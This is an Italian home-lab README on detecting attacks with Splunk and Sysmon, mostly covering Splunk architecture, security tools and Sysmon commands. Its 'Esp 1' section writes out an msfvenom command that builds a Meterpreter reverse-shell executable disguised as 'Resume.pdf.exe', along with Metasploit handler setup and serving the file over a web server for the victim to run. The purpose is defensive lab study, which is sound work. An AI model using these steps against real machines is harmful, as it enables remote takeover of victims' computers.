# HomeLab_Splunk-Sysmon
Ambiente di Testing composto da una VM Kali da cui vengono lanciati gli attacchi e una macchina windows su cui è installato Splunk+Sysmon. Implementazioni future: alert via mail, attacchi più sofisticati 
## Intro Splunk

L'architettura di Splunk è progettata per raccogliere, indicizzare, cercare, monitorare e analizzare i dati generati dalle macchine. È composta da diversi componenti:

### 1. **Forwarder (Inoltratore)**

Raccoglie i dati dai dispositivi di origine e li invia agli Indexer.

- **Universal Forwarder**: Leggero, invia dati senza elaborazione.
- **Heavy Forwarder**: elabora i dati e li invia

### 2. **Indexer**

Riceve i dati dai Forwarder, li indicizza e li memorizza in un formato facilmente ricercabile.

- **Output**: Archivi di dati indicizzati e metadati per l'accesso rapido.

### 3. **Search Head (Testa di Ricerca)**

Fornisce un'interfaccia utente per effettuare ricerche e analisi sui dati indicizzati.

### 4. **Cluster Master (Master del Cluster)**

Gestisce la configurazione e il bilanciamento del carico negli ambienti cluster.

- **Ruoli**:
    - **Gestione dei Replicanti**: Coordina la replicazione dei dati tra gli Indexer.
    - **Configurazione**: Distribuisce le configurazioni agli altri nodi del cluster.

### 5. **Deployment Server (Server di Distribuzione)**

- **Funzione**: Gestisce e distribuisce le configurazioni e le applicazioni ai Forwarder e agli altri nodi di Splunk.
- **Ruoli**:
    - **Automazione**: Facilita la gestione centralizzata dei nodi Splunk.
    - **Aggiornamenti**: Distribuisce aggiornamenti e modifiche di configurazione.

### 6. **Management Console**

- **Funzione**: Monitora e gestisce l'intero ecosistema Splunk.
- **Ruoli**:
    - **Monitoraggio**: Fornisce una visione centralizzata dello stato e delle prestazioni dei vari componenti.
    - **Amministrazione**: Offre strumenti per la gestione dell'infrastruttura Splunk.

### Diagramma dell'Architettura

```sql
+-------------------+
|  Search Head      |
|  +-------------+  |
|  |   User      |  |
|  | Interface   |  |
|  +-------------+  |
+-------------------+
          |
          v
+-------------------+
|     Indexer       |
|  +-------------+  |
|  | Indexing    |  |
|  | Storage     |  |
|  +-------------+  |
+-------------------+
          ^
          |
+-------------------+
|   Forwarder       |
|  +-------------+  |
|  | Data        |  |
|  | Collection  |  |
|  +-------------+  |
+-------------------+

```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/8e346f18-51bb-41e6-9067-744fc6059cb3/2468e165-87a1-4130-8c92-48689a19b37a/Untitled.png)

### Recappino

- **IDS/IPS:**
    - **Snort:** Rilevamento e prevenzione intrusioni di rete.
    - **Suricata**
- **SIEM:**
    - **Splunk:** Analisi log e gestione eventi di sicurezza.
    - **Elastic Stack:** Suite open-source per raccolta e analisi dati.
    - **OSSIM:** SIEM open-source integrato con più strumenti di sicurezza.
- **NSM:**
    - **Security Onion:** Monitoraggio sicurezza di rete con vari strumenti (Snort, Zeek, ecc.).
- **SOAR:**
    - **Phantom (ora in Splunk):** Automazione e orchestrazione della risposta agli incidenti.

<aside>
🛠 Splunk prova 60gg, sysmon download + olaf config, same dir, pwshell → admin → `.\Sysmon64.exe -i`

</aside>

### Sysmon usage

*Install:                            Sysmon64.exe -i [<configfile>]
Update configuration:    Sysmon64.exe -c [<configfile>]
Install event manifest:    Sysmon64.exe -m
Print schema:                 Sysmon64.exe -s
Uninstall:                       Sysmon64.exe -u [force]
-c   Update configuration of an installed Sysmon driver or dump the
current configuration if no other argument is provided. Optionally
take a configuration file.
-i   Install service and driver. Optionally take a configuration file.
-m   Install the event manifest (done on service install as well)).
-s   Print configuration schema definition of the specified version.
Specify 'all' to dump all schema versions (default is latest)).
-u   Uninstall service and driver. Adding force causes uninstall to proceed
even when some components are not installed.*

### Splunk

add data → monitor : controllo in tempo reale file e porte su questo pc

local event logs (es. app, sec,system) → selezioni i log registrati localmente

### Esp 1

Facciamo una scansione con NMAP verso l’indirizzo della macchina WIN (ricorda di attivare RDP - 3389 su win)

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8e346f18-51bb-41e6-9067-744fc6059cb3/34310e0c-fdbd-4762-bf19-e505a87e6239/image.png)

Ora iniziamo a creare il malware, usando MSFvenom (config iniziale di metaspolit)

creiamo dei payload per windows → funzionamento di base della telemetria

https://www.youtube.com/watch?v=QyseHxzYDi4

Con `msfvenom -l payloads` ci mostra tutti i possibili payload che possiamo usare

scegliamo `meterpeter reverse tcp` 

**`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost-192.168.65.128 lport-4444 -f exe -o Resume.pdf.exe`**

-p → payload che vogliamo usare

lhost → host attaccante (kali)

lport → port attaccante (kali)

-f → formato del file (eseguibile)

-o → file output

Ora apriamo la console di metasploit →  `msfconsole` (ricorda prima di aggiornarlo `msfupdate`)

`use exploit/multi/handler` → abbiamo un payload creato esternamente al fw metasploit

`opstions` → vediamo cosa possiamo configurare: tipo di payload, lhost, lport

`set payload windows/x64/meterpeter/reverse_tcp` → settiamo il tipo di pload

`settiamo lhost → set lhost ipkali` 

ora eseguiamo l’exploit → `exploit`

### Come presentiamo il file contenente il payload a win10?

Possiamo creare un webserver (rendiamolo il più reale possibile)

`python3 -m http.server 9999` → startiamo un server sulla porta 9999 

eseguiamolo su win → con netstat -anob vediamo che si è instaurata la conn
